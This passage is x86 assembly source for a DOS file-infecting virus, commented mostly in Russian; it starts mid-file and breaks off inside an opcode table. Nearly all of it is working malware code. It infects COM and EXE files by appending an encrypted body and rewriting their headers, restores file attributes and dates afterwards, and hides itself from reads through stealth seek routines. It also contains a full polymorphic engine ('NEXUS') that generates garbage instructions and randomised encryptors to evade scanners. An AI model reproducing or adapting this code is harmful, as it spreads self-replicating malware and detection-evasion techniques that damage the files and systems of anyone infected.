 Read:  mov     ah,3fh          ; чтение из файла
        call    int21
        ret

 CloseFile:
        mov     ah,3eh          ; закрытие файла
        call    int21
        ret

 LFNClrAttrib:
        mov     ax,7143h        ; LFN получение и очистка аттрибутов
        mov     bl,0            ; файла
        call    int21
        jc      ClrFailed
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        mov     ax,7143h
        mov     bl,1
        xor     cx,cx
        call    int21
        jmp     ClrFailed

 ClrAttrib:
        mov     ax,4300h        ; получение и очистка аттрибутов
        call    int21           ; файла
        jc      ClrFailed       ; также сохранение указателя на файл
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        mov     ax,4301h
        xor     cx,cx
        call    int21
 ClrFailed:
        ret

 LFNRestAttrib:
        mov     ax,7143h        ; LFN восстановление аттрибутов
        mov     bl,1            ; файла по сохраненному указателю
        mov     cx,cs:Attrib
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        call    int21
        ret
 RestAttrib:
        mov     ax,4301h        ; восстановление аттрибутов
        mov     cx,cs:Attrib    ; файла по сохраненному указателю
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        call    int21
        ret

 SeekSave:
        call    SaveRegs        ; сохранение позиции
        xor     cx,cx           ; указателя (lseek) в файле
        xor     dx,dx
        call    seekfrom_cur
        mov     cs:seek_pos,ax
        mov     cs:seek_pos+2,dx
        call    LoadRegs
        ret

 RestoreSeek:
        call    SaveRegs        ; восстановление сохраненной
        mov     dx,cs:seek_pos  ; позиции указателя а файле
        mov     cx,cs:seek_pos+2
        call    seekfrom_bof
        call    LoadRegs
        ret

 seek2bof:
        mov     ax,4200h        ; установка указателя на
        xor     cx,cx           ; начало файла
        xor     dx,dx
        jmp     realseek

 seek2eof:
        mov     ax,4202h        ; установка указателя на
        xor     cx,cx           ; конец файла
        xor     dx,dx
        jmp     realseek

 seekfrom_eof:
        mov     ax,4202h        ; установка указателя
        jmp     realseek        ; от конца файла

 seekfrom_cur:
        mov     ax,4201h        ; установка указателя
        jmp     realseek        ; от текущей позиции

 seekfrom_bof:
        mov     ax,4200h        ; установка указателя
                                ; от начала файла
 realseek:
        call    int21
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; обработчик int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int24: mov     al,3            ; AL=3:вернуть ошибку
        iret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; псевдо int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int21: pushf                   ; занос в стек флагов и кодового
        push    cs              ; сегмента
        call    exithandler     ; управление вернется по адресу в стеке
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла (дисковый?)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 HandleCheck:
        call    SaveRegs        ; сохранение регистров
        mov     ax,4400h        ; IOCTL: Get device info
        call    int21
        jc      Invalid         ; bad handle?
        test    dl,80h          ; проверка 7-го бита
        jnz     Invalid         ; если 0, то это дисковый файл

        call    LoadRegs        ; восстановление регистров
        clc
        ret

 Invalid:
        call    LoadRegs        ; восстановление регистров
        stc
        ret


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; перевод двух латинских символов в AH и AL в верхний регистр
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 upreg:
        cmp     al,61h          ; 'a'
        jb      badal
        cmp     al,7ah          ; 'z'
        ja      badal
        sub     al,20h          ; 's'->'S'
 badal: cmp     ah,61h          ; 'a'
        jb      badah
        cmp     ah,7ah          ; 'z'
        ja      badah
        sub     ah,20h          ; 's'->'S'
 badah: ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SeekHide
; если позиция lseek находится на теле вируса, подпрограмма переносит его
; на границу вируса и зараженной программы, т.е. на конец чистой программы
; SEEK_POS содержат новую позицию lseek
; NRBYTES уменьшается на разность двух позиций
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekhide:
        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохраняем текущее положение указателя
        mov     cx,-1           ; двигаем указатель на границу вируса и
        mov     dx,-vsize       ; программы
        call    seekfrom_eof    ; DX:AX - голова вируса
        sub     ax,cs:seek_pos  ; SEEK_POS - старая позиция
        sbb     dx,cs:seek_pos+2
        cmp     dx,-1           ; DX:AX должно быть отрицательным
        jnz     not_us
        or      ax,ax
        jns     not_us
        neg     ax              ; получение разности позиций
        sub     cs:nrbytes,ax   ; уменьшение количества прочитанных байтов
        sub     cs:seek_pos,ax  ; уменьшение позиции указателя в файле
        sbb     cs:seek_pos,0   ; т.е. смещение ее на голову вируса
 not_us:
        call    RestoreSeek     ; восстановление позиции указателя
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подсчет CRC вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crc:   push    si cx
        lea     si,shield
        mov     cx,end_crc-shield
        call    crc32
        pop     cx si
        ret

 CRC32: push    ebx ecx edx esi edi ds
        cld
        mov     di,cx
        mov     ecx,-1
        mov     edx,ecx
        mvs     ds,cs

   NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
   NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0edb8h
   NoCRC:
        dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     di
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        pop     ds edi esi edx ecx ebx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование handle
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Infect_Handle:
        push    cs cs           ; ds и es показывают на нас
        pop     ds es
        call    HandleCheck     ; проверка файла на фиктивность (disk file?)
        jc      close

        call    Inf_Check       ; проверка файла на повторное заражение
        jc      close

        mov     cx,32           ; чтение заголовка файла
        lea     dx,original
        call    read
        cmp     cx,ax           ; DOS вернул все запрошенные для
        jne     close           ; чтения байты?

        lea     si,original     ; сделать копию оригинального
        lea     di,header       ; начала программы
        mov     cx,32
        cld
        rep     movsb

        lea     di,header
        mov     ax,[di]         ; взять в ax первые 2 байта заголовка
        cmp     ax,'ZM'         ; проверка на EXE тип
        je      exeinfect
        cmp     ax,'MZ'         ; таких EXEшников я никогда не видел
        je      exeinfect       ; но говорят такие бывают

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование COM файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close           ; место еще оставлено под стек и PSP
        mov     B [di],0e9h     ; запись JMP
        mov     delta,ax        ; дополнительное смещение для полиморфа
        sub     ax,3            ; коррекция (минус размер jump'а)
        mov     W [di+1],ax     ; запись адреса перехода
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование EXE файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinfect:
        cmp     B [di+18h],'@'  ; проверка файла на принадлежность
        je      Close           ; к новому семейству WinNE файлов

        mov     ax,W [di+4]     ; считать параметр PageCnt
        mov     cx,W [di+2]     ; считать параметр PartPag
        or      cx,cx           ; если длина последней страницы равна
        jz      $+3             ; нулю, то параметр PageCnt не содержит
        dec     ax              ; дополнительной единицы
        mov     dx,512          ; умножение на 512 (получение байт)
        mul     dx
        add     ax,cx           ; получение длины из EXE файла, которая
        adc     dx,0            ; грузится в память при запуске это EXE

        push    dx ax           ; сохранить пареметр в стеке
        call    seek2eof        ; получение дискового размера файла
        pop     si cx           ; загрузка параметров из стека
        cmp     si,ax           ; сравнение параметров (выявление
        jnz     Close           ; всяких overlay структур)
        cmp     cx,dx
        jnz     Close           ; очень большие файлы нам не подходят
        cmp     dx,10           ; как они в память грузяться??? но такие
        jae     Close           ; бывают (случается divide overflow ниже)

        push    ax dx           ; сохранение параметров
        mov     cx,16           ; получение входной точки (CS:IP), которые
        div     cx              ; расположены в конце чистого EXE файла
        sub     ax,[di+8]       ; вычитание размера EXE заголовка
        mov     delta,dx        ; дополнительное смещение для полиморфа
        sub     ax,10h          ; подобие COM файлу (IP больше/равно 100h)
        add     dx,100h
        mov     W [di+14h],dx   ; сохранение IP
        mov     W [di+16h],ax   ; сохранение CS
        mov     W [di+0eh],ax   ; сохранение SS (ой TBSCAN заорет)
        mov     W [di+10h],-2   ; сохранение SP
        pop     dx ax           ; загрузка параметров из стека

        add     ax,vsize        ; добавление к размеру файла
        adc     dx,0            ; длины вируса
        mov     cx,512          ; считаем новые PartPag и PageCnt для
        div     cx              ; файла вместе с вирусом
        or      dx,dx
        jz      $+3
        inc     ax
        mov     [di+2],dx       ; сохранение PartPag
        mov     [di+4],ax       ; сохранение PageCnt

 Check: call    WriteVirus      ; запись вирус в файл

 Close: call    CorrectDate     ; правка даты инфицированного файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; запись зашифрованного тела вируса в файл
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 writevirus:
        call    GetDate         ; запрос времени/даты файла

        cmp     cs:save_ax,1857h; проверка необходимости порверки
        jz      no_time         ; времени файла

        mov     ah,2ch          ; запрос текущего времени
        call    int21           ; в dx:cx
        mov     ax,cs:time      ; в ax время файла
        shr     ah,3            ; берем часы (биты 11-15 в cx)
        cmp     ah,ch           ; совпадают? если да, то съябываемся,
        je      write_fail      ; чтобы не засветиться
 no_time:
        call    seek2eof        ; -> конец
        call    nexus
        call    write           ; записываемся в файл
        xor     cx,ax           ; все записалось?
        jnz     write_fail

        call    seek2bof        ; идем в начало
        mov     cx,32           ; заголовок com/exe файла
        lea     dx,header
        call    write

  write_fail:
        call    RestDate        ; восстановление даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла на инфицированность
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Inf_Check:
       call    SaveRegs         ; сохранить в стеке регистры

       call    SeekSave         ; сохраняем позицию lseek
       mov     cx,-1            ; переносим указатель на начало
       mov     dx,-vsize        ; тела вируса
       call    seekfrom_eof

       mov     cx,vsize         ; читаем дескриптор в буфер
       lea     dx,buffer
       push    cs cs
       pop     ds es
       call    read

       call    RestoreSeek      ; восстановить позицию lseek
       xor     cx,ax            ; все прочиталось?
       jnz     not_infected

       lea     si,v_id
       lea     di,[buffer+(signature-ksenia)]
       mov     cx,ssize
       cld
       repe    cmpsb
       jnz     not_infected

       call    LoadRegs
       stc
       ret

 not_infected:
       call    LoadRegs
       clc
       ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; CRLOAD - подпрограмма для получения оригинального начала
; зараженной программы из зашифрованного вируса в этой программе
; вход: BX - handle инфицированной программы
; выход: "buffer" содержит 32 оригинальных байта
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crload:
        call    SaveRegs        ; сохранение регистров
        push    cs cs           ; инициализация сегментных регистров
        pop     ds es

        xor     cx,cx           ; сохранение позиции указателя в файле
        xor     dx,dx
        call    seekfrom_cur
        push    dx ax

        mov     cx,-1           ; идем к голове вируса (т.к. вирус записан
        mov     dx,-vsize       ; в конце программы, его начало будет распо-
        call    seekfrom_eof    ; ложено на VSIZE байт от конца файла)

        mov     cx,vsize        ; читаем зашифрованный вирус
        lea     dx,buffer       ; в буфер
        call    read

        pop     dx cx           ; восстанавливаем позицию указателя
        call    seekfrom_bof

        mov     si,w [buffer+(nex_ptr-ksenia)]
        mov     ax,[si+1]       ; чтение расшифровщика
        and     ah,not 111b
        or      ah,101b         ; расшифровка с регистром DI
        mov     w do_enc,ax
        test    al,10b          ; проверка необходимости ключа
        mov     al,[si+3]       ; чтение ключа
        jz      _key
        mov     al,90h
 _key:  mov     B do_enc+2,al
        mov     B do_enc+3,0c3h ; сохранение команды RET в ячейке

        mov     cx,32           ; подготовка к расшифровке
        lea     si,[buffer+(original-ksenia)]
        lea     di,buffer

 crge:  lodsb                   ; чтение байта
        mov     [di],al         ; сохранение байта
        call    near ptr do_enc ; расшифровка байта
        inc     di              ; далее
        loop    crge

        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Polymorphic engine [NEXUS]
; "DELTA" = delta offset in file
; OUT - CX = virus size
; OUT - DX = polymorph code
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 nexus: call    SaveRegs        ; инициализация
        push    cs cs
        pop     ds es
        cld
        lea     di,buffer

        mov     w r_used,-1     ; ни один из регистров не используется
        call    garbage         ; генерация мусора

        mov     wflag,2         ; get random count register
        call    get_reg
        mov     r_used,al
        or      al,10111000b    ; create MOV opcode
        stosb                   ; save it
        mov     ax,vsize-crlen
        stosw
        call    garbage         ; put some garbage

 get_idx:
        call    get_reg         ; get random index register (BX DI SI)
        mov     ah,111b         ; check if BX register
        cmp     al,011b
        je      got_idx
        mov     ah,100b         ; check if SI register
        cmp     al,110b
        je      got_idx
        mov     ah,101b         ; check if DI register
        cmp     al,111b
        jne     get_idx
 got_idx:
        mov     r_used +1,al
        mov     rm_field,ah
        or      al,10111000b       ; create MOV opcode
        stosb                      ; save it
        mov     offs_ptr,di        ; save ptr to the offset
        mov     ax,?
        stosw
        call    garbage            ; put some garbage

 bad_crypt:
        mov     cr_ptr,di
        mov     ax,ctotal          ; choose random encryptor
        lea     si,crins
        call    get_rnd
        imul    ax,(cp2n-crins)
        add     si,ax
        mov     ax,W [si]         ; read encrypt opcode
        or      ah,101b           ; encrypt with DI
        mov     W do_enc,ax
        mov     ax,0ffh           ; get any random value
        call    get_rnd
        inc     ax
        test    B do_enc,10b      ; проверка необходимости ключа
        jz      stos_it
        mov     al,90h
 stos_it:
        mov     do_enc+2,al
        mov     B do_enc+3,0c3h   ; сохранение команды RET в ячейке
        mov     al,[di]           ; check if it realy crypts byte
        call    near ptr do_enc
        cmp     al,[di]
        mov     [di],al
        jz      bad_crypt

        mov     al,2eh
        stosb
        mov     ax,W [si+2]       ; read decrypt opcode
        or      ah,rm_field       ; update opcode
        stosw
        test    al,10b            ; проверка необходимости ключа
        jnz     no_stos
        mov     al,do_enc+2
        stosb
 no_stos:
        call    garbage            ; put some garbage

        mov     al,01000000b       ; update index register
        or      al,r_used +1
        stosb
        call    garbage            ; put some garbage
        mov     al,01001000b       ; update count register
        or      al,r_used
        stosb
        mov     al,01110101b       ; jnz
        stosb
        mov     ax,cr_ptr
        sub     ax,di
        dec     ax
        stosb

        mov     si,di
        sub     si,offset buffer
        mov     ax,crlen
        sub     ax,si
        call    fixedfill          ; put AX bytes of the garbage

        mov     ax,di              ; calculate decryptor size
        sub     ax,offset buffer-100h
        add     ax,delta
        mov     si,offs_ptr
        mov     [si],ax

; copy virus body to the buffer and encrypt it "on the fly"
        mov     cx,shield-ksenia-crlen
        lea     si,ksenia+crlen
        lea     di,buffer+crlen
        rep     movsb
        mov     cx,original-shield-1
 dupcr: lodsb
        sub     al,[si]
        stosb
        loop    dupcr
        mov     cx,eov-original+1
        rep     movsb

; polymorph it!
        mov     cx,vsize-crlen
        lea     di,buffer+crlen
 _encr: call    near ptr do_enc
        inc     di
        loop    _encr

        lea     si,v_id
        lea     di,[buffer+(signature-ksenia)]
        mov     cx,ssize
        rep     movsb
        mov     ax,cr_ptr
        mov     w [buffer+(nex_ptr-ksenia)],ax

        call    LoadRegs
        mov     cx,vsize
        lea     dx,buffer
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода на базе таблицы
; в качестве входных параметров установить ES:DI на буфер для результата
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 maxg   equ     crlen/7         ; maximum number of garbage bytes
 fixedfill:                     ; fixed number of garbage bytes (AX)
        call    SaveRegs
        jmp     fill
 garbage:
        call    SaveRegs
        mov     ax,maxg         ; getting random number of garbage
        call    get_rnd         ; instructions
 fill:  mov     cx,ax           ; exit on CX=0
        or      cx,cx
        jz      garb_ret

 gloop: push    cx di
        lea     si,opcz         ; SI -> our table with opcodes and offsets
        mov     ax,total        ; get random number of instruction
        call    get_rnd
        imul    ax,op2n-opcz    ; get relative offset ()
        add     si,ax
        mov     dx,[si]         ; read instruction opcode
        xchg    dl,dh

        mov     wflag,0         ; no W field means
        cmp     B [si+2],0ffh   ; check if W field required
        jz      no_W

        mov     ax,2            ; get 0 or 1 (B/W)
        call    get_rnd
        mov     wflag,ax        ; set value to number of required random
        inc     wflag           ; bytes after instruction
        mov     cl,B [si+2]     ; read W-bit number
        shl     ax,cl           ; set it up
        or      dx,ax           ; update opcode

 no_W:  cmp     B [si+3],0ffh   ; check if REG field required
        jz      no_R
        call    get_reg         ; get random register number (REG)
        mov     cl,B [si+3]     ; read REG bit number
        shl     ax,cl
        or      dx,ax           ; update opcode

 no_R:  xchg    ax,dx           ; store instruction
        xchg    al,ah           ; if instruction the same with the previous

        cmp     al,0feh
        jae     no_store
        stosb
        cmp     si,offset onebyte
        jae     imm8
        xchg    al,ah
        stosb

 imm8:  mov     cx,wflag       ; get number of random
        jcxz    no_store       ; bytes after instruction
 rndb:  mov     ax,100h
        call    get_rnd
        stosb
        loop    rndb
 no_store:
        pop     ax cx
        sub     ax,di
        neg     ax              ; number of bytes of the instruction
        sub     cx,ax
        ja      gloop
        jz      garb_ret
        add     cx,ax
        sub     di,ax
        jmp     gloop

 garb_ret:
        mov     wflag,di
        call    LoadRegs
        mov     di,wflag
        ret

; gets random REG field into al without [r_used ]
 get_reg:
        mov     ax,8            ; get random value
        call    get_rnd
        mov     ah,al

        cmp     wflag,1         ; check REG
        jnz     r16
        and     ah,11111011b    ; 8-bit regs
        jmp     allbits

 r16:   cmp     ah,100b         ; check for SP REG
        jz      get_reg
 allbits:
        cmp     r_used,ah       ; 16-bit regs
        jz      get_reg
        cmp     r_used+1,ah
        jz      get_reg
        cbw
        ret

; encryptors    FEDCBA98  76543210
; dectyptors    ||||||||  ||||||||
 crins  label   byte
        db      10000000b,00110000b       ; XOR
        db      10000000b,00110000b       ; XOR

 cp2n   db      10000000b,00000000b       ; ADD
        db      10000000b,00101000b       ; SUB

        db      10000000b,00101000b       ; SUB
        db      10000000b,00000000b       ; ADD

        db      11000000b,00001000b       ; ROR
        db      11000000b,00000000b       ; ROL

        db      11000000b,00000000b       ; ROL
        db      11000000b,00001000b       ; ROR

        db      11110110b,00010000b       ; NOT
        db      11110110b,00010000b       ; NOT

        db      11110110b,00011000b       ; NEG
        db      11110110b,00011000b       ; NEG

        db      11111110b,00000000b       ; INC
        db      11111110b,00001000b       ; DEC

        db      11111110b,00001000b       ; DEC
        db      11111110b,00000000b       ; INC
 ctotal equ     ($-crins)/(cp2n-crins)

; opcodes       FEDCBA98  76543210
; table         ||||||||  ||||||||
 opcz   db      11000110b,11000000b       ; opcode   (MOVL)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
 op2n   db      10000000b,11000000b       ; opcode   (ADD)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11101000b       ; opcode   (SUB)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11111000b       ; opcode   (CMP)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110111b,11011000b       ; opcode   (NEG16)
        db      0ffh                      ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110111b,11010000b       ; opcode   (NOT16)
        db      0ffh                      ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11100000b       ; opcode   (AND)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110110b,11000000b       ; opcode   (TEST)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11001000b       ; opcode   (OR)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11110000b       ; opcode   (XOR)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11011000b       ; opcode   (SBB)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11010000b       ; opcode   (ADC)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11001101b,00000001b       ; opcode   (INT 01)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11001101b,00000011b       ; opcode   (INT 03)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      01110000b,0               ; opcode   (Jxx $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      01111000b,0               ; opcode   (Jxx $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      11100011b,0               ; opcode   (Jcxz $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11101011b,0               ; opcode   (Jmp short $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
 onebyte:       ; - One-byte instructions
        db      10110000b,0               ; opcode   (MOV)
        db      0bh                       ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      01000000b,0               ; opcode   (INC)
        db      0ffh                      ; W field ptr (FF if none)
        db      0Ah-2                     ; "reg" bit ptr (FF if none)
        db      01001000b,0               ; opcode   (DEC)
        db      0ffh                      ; W field ptr (FF if none)
        db      0Ah-2                     ; "reg" bit ptr (FF if none)
        db      11001100b,0               ; opcode   (int3)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11111000b,0               ; opcode   (S/Cf)
        db      0ffh                      ; W field ptr (FF if none)
